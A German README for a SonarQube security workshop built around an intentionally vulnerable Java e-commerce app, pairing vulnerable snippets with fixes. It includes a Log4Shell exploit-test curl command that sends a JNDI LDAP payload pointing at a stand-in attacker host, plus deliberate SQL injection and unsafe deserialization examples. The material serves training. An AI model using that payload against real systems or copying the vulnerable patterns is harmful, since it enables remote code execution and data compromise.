# SonarQube Workshop - Vulnerable E-Commerce Application

## 🎯 Workshop-Ziel

Dieses Projekt demonstriert **realistische Sicherheitslücken und Code-Quality-Probleme**, die in echten Projekten vorkommen. Teilnehmer lernen:

1. Wie SonarQube Probleme erkennt
2. Wie man vulnerable Dependencies identifiziert
3. Wie man Code-Smells behebt
4. Best Practices für sichere Entwicklung

## ⚠️ WARNUNG

**NIEMALS IN PRODUKTION VERWENDEN!**

Dieses Projekt enthält absichtlich:
- Log4Shell Vulnerability (CVE-2021-44228)
- Jackson Deserialization Attacks
- SQL Injection
- Multiple weitere Sicherheitslücken

## 📋 Voraussetzungen

- Java 11+
- Maven 3.6+
- Docker (für SonarQube)
- IDE (IntelliJ IDEA, Eclipse, VS Code)

## 🚀 Setup

### 1. SonarQube lokal starten

```bash
# SonarQube Container starten
docker run -d --name sonarqube -p 9000:9000 sonarqube:latest

# Warten bis SonarQube bereit ist (~2 Minuten)
# Browser öffnen: http://localhost:9000
# Default Login: admin/admin
```

### 2. Projekt analysieren

```bash
# Dependencies herunterladen
mvn clean install

# SonarQube Analyse
mvn sonar:sonar \
  -Dsonar.projectKey=ecommerce-vulnerable \
  -Dsonar.host.url=http://localhost:9000 \
  -Dsonar.login=admin \
  -Dsonar.password=admin
```

### 3. OWASP Dependency Check

```bash
# Vulnerability Scan der Dependencies
mvn dependency-check:check

# Report ansehen
open target/dependency-check-report.html
```

## 📊 Erwartete SonarQube Ergebnisse

### Security
- **Vulnerabilities**: 6+
- **Security Hotspots**: 10+
- **Security Rating**: E (schlechteste)

### Reliability
- **Bugs**: 15+
- **Reliability Rating**: D

### Maintainability
- **Code Smells**: 50+
- **Technical Debt**: 2+ Tage
- **Maintainability Rating**: C-D

### Coverage
- **Code Coverage**: 0% (keine Tests)

## 🔍 Die gefährlichsten Probleme

### 1. Log4Shell (CRITICAL)
**Dateien**: `UserService.java`, `FileUploadController.java`

```java
// ❌ VULNERABLE
logger.info("User input: " + userInput);

// ✅ FIXED
logger.info("User input: {}", userInput); // Parameterized logging
```

**Exploit Test** (NUR in isolierter Umgebung!):
```bash
curl -X POST http://localhost:8080/user/search \
  -d "email=\${jndi:ldap://attacker.com/Exploit}"
```

### 2. Jackson Deserialization (CRITICAL)
**Datei**: `UserService.java` Zeile 131-140

```java
// ❌ VULNERABLE
objectMapper.enableDefaultTyping();
User user = objectMapper.readValue(jsonData, User.class);

// ✅ FIXED
// Kein enableDefaultTyping()
// JSON Schema Validation verwenden
```

### 3. SQL Injection (CRITICAL)
**Datei**: `UserService.java` Zeile 36-38

```java
// ❌ VULNERABLE
String query = "SELECT * FROM users WHERE email = '" + email + "'";

// ✅ FIXED
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE email = ?"
);
stmt.setString(1, email);
```

## 🎓 Workshop-Aufgaben

### Level 1: Basics (30 Min)
- [ ] SonarQube lokal aufsetzen
- [ ] Projekt einmal durchscannen
- [ ] Die Top 10 Issues identifizieren
- [ ] Ein Code Smell fixen (z.B. Magic Numbers)

### Level 2: Security (45 Min)
- [ ] OWASP Dependency Check ausführen
- [ ] Alle vulnerable Dependencies identifizieren
- [ ] Log4j auf sichere Version updaten
- [ ] SQL Injection mit PreparedStatement fixen

### Level 3: Code Quality (60 Min)
- [ ] Cognitive Complexity von `validateAndProcessUser()` reduzieren
- [ ] Resource Leaks mit try-with-resources fixen
- [ ] Code Duplication eliminieren
- [ ] Unit Tests schreiben (Coverage erhöhen)

### Level 4: Architecture (90 Min)
- [ ] Circular Dependency zwischen UserService ↔ OrderRepository auflösen
- [ ] Proper Dependency Injection implementieren
- [ ] Service Layer Pattern korrekt umsetzen

## 📚 Lernressourcen

### CVE Details
- [CVE-2021-44228 (Log4Shell)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228)
- [Jackson Databind CVEs](https://github.com/FasterXML/jackson-databind/issues?q=is%3Aissue+CVE)
- [Commons FileUpload CVE-2016-1000031](https://nvd.nist.gov/vuln/detail/CVE-2016-1000031)

### SonarQube
- [SonarQube Rules](https://rules.sonarsource.com/java)
- [Security Rules](https://rules.sonarsource.com/java/type/Security%20Hotspot)

### OWASP
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Dependency Check](https://owasp.org/www-project-dependency-check/)

## 🛠️ Fixes - Cheat Sheet

### Dependencies aktualisieren (pom.xml)

```xml
<!-- ✅ FIXED Versions -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.20.0</version>
</dependency>

<dependency>
    <groupId>com.fasterxml.jackson.core</groupId>
    <artifactId>jackson-databind</artifactId>
    <version>2.15.2</version>
</dependency>

<dependency>
    <groupId>commons-fileupload</groupId>
    <artifactId>commons-fileupload</artifactId>
    <version>1.5</version>
</dependency>

<dependency>
    <groupId>org.springframework</groupId>
    <artifactId>spring-core</artifactId>
    <version>6.0.11</version>
</dependency>
```

## 🤝 Diskussionspunkte

1. **Warum passiert so etwas?**
   - Technical Debt
   - Zeitdruck
   - Fehlende Awareness
   - Keine automatisierten Checks

2. **Wie verhindert man es?**
   - Dependency Scanning in CI/CD
   - SonarQube Quality Gates
   - Security Training
   - Code Reviews

3. **Real-World Impact**
   - Log4Shell: Milliarden $ Schaden
   - Equifax Breach: Apache Struts
   - Target Breach: Vendor Access

## 📧 Feedback

Fragen oder Verbesserungsvorschläge? Nutzt die Retrospektive am Ende des Workshops!

---

**Happy Scanning! 🔍**
